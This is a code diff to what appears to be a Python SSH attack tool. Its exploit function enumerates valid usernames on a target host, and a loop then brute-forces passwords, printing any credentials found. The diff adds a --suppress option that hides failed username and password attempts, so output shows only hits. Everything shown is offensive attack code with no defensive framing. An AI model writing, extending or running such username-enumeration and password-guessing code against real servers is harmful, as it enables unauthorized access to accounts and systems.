@@ -114,7 +114,7 @@ def exploit(hostname, username, port, validuser = ""):
         if result[1]:
             print(Fore.BLUE+ "[+] User: " + result[0]+" => is a valid user" + Style.RESET_ALL)
             validuser = (result[0])
-        else:
+        elif args.suppress == False:
             print(Fore.YELLOW+ "[*] User: " + result[0]+" => is not a valid user" + Style.RESET_ALL)
 
     
@@ -150,6 +150,7 @@ try:
     arg_parser.add_argument('hostname', type=str, help="The target hostname or ip address")
     group = arg_parser
     arg_parser.add_argument('--port', type=int, default=22, help="The target port (Default 22)")
+    arg_parser.add_argument('--suppress', type=bool, default=False, help="Suppresses unsuccessful usernames or passwords")
     group = arg_parser.add_mutually_exclusive_group(required=True)
     group.add_argument('--username', type=str, help="A Single Usename to Enumerate")
     group.add_argument('--userfile', type=str, help="The list of usernames (one per line) to enumerate through")
@@ -199,7 +200,7 @@ try:
                     response = ssh_connect(args.hostname, args.port, validuser, password)                
                     if response == 0:
                         print(Fore.GREEN + "[+] User: %s [+] Pass Found: %s" % (validuser, password)+ Style.RESET_ALL)
-                    elif response == 1:
+                    elif response == 1 and args.suppress == False:
                         print(Fore.RED + "[/] User: %s [/] Pass: %s => Login Incorrect!!! <=" % (validuser, password)+ Style.RESET_ALL)  
                     elif response == 2:
                         print("[-] Connnection could not be established to the address: %s" % (args.hostname))
